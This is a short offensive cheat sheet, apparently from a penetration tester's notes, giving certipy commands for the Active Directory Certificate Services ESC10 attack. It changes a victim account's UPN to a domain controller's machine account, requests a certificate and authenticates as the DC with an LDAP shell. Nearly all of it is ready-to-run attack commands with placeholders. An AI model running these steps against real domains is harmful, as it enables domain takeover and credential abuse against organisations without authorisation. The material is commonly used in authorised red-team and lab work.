# ADCS ESC10

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Read Victim User (optional)
```
certipy account -u '<username>@<domain>' -p '<password>' -dc-ip '<DC_IP>' -user '<VICTIM>' read
```

## 3. Update Victim User
```
certipy account -u '<username>@<domain>' -p '<password>' -dc-ip '<DC_IP>' -upn '<DC$>@<domain>' -user '<VICTIM>' update
```

## 4. Export Ticket
```
export KRB5CCNAME=<USERNAME>.ccache
```

## 5. Request certificate
```
certipy req -k -dc-ip '<DC_IP>' -target '<CA_FQDN>' -ca '<CA_HOST>' -template 'User'
```

## 6. Revert Victim User
```
certipy account -u '<username>@<domain>' -p '<password>' -dc-ip '<DC_IP>' -upn '<VICTIM>@<domain>' -user '<VICTIM>' update
```

## 7. Authenticate
```
certipy auth -pfx <DC_PFX>.pfx -dc-ip <DC_IP> -ldap-shell
```
